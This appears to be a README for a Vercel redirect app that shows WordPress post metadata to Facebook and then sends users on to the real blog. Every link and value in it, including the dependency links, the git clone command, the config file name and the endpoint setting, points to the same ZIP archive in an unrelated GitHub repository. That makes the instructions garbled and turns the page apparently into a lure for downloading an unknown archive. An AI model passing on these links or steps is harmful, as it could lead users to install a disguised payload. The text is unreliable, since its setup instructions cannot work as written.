# Vercel Redirect

It redirects the website request from facebook to any blog while keeping the meta data for the each link. This app uses [https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip](https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip) and the SSR!

### Requirements

- [WordPress](https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip)
- [WPGraphQL](https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip)
- Environment variables (see below)

```
git clone https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip
```

Add an `https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip` file to the root with the following:

```
GRAPHQL_ENDPOINT="https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip"
```

Then run the development server,

```bash
npm run dev
# or
yarn dev
```

| Name             | Required | Default | Description                                                 |
| ---------------- | -------- | ------- | ----------------------------------------------------------- |
| GRAPHQL_ENDPOINT | Yes      | -       | WordPress WPGraphQL endpoint (ex: https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip) |

To get the particular post from link https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip
Replace it by https://raw.githubusercontent.com/kartkinadziendobry/Cardss/main/Japanology/Cardss.zip
When you post this new vercel link on facebook,
It shows the post metadata and content from the vercel,
When user click on this link it will redirect them to the actual wordpress domain.
